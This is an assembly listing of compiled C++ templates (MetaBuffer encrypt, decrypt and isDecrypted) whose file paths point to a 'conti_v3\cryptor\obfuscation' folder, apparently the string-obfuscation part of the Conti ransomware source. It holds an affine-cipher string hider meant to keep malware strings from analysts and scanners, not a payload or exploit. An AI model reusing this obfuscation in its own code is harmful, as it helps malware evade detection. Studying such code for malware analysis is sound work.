;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 0a	 sub	 eax, 10
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0a	 add	 r8d, 10
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 0f	 sub	 eax, 15
  00006	44 6b c0 07	 imul	 r8d, eax, 7

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6d	 imul	 r8d, eax, 109		; 0000006dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0f	 add	 r8d, 15
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 30 00 00 00	 mov	 ecx, 48			; 00000030H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 30	 add	 r8d, 48			; 00000030H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 43	 sub	 eax, 67			; 00000043H
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 43	 add	 r8d, 67			; 00000043H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1e 00 00 00	 mov	 ecx, 30
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2c	 imul	 r8d, ecx, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 65	 imul	 r8d, eax, 101		; 00000065H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1e	 add	 r8d, 30
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 15	 sub	 eax, 21
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
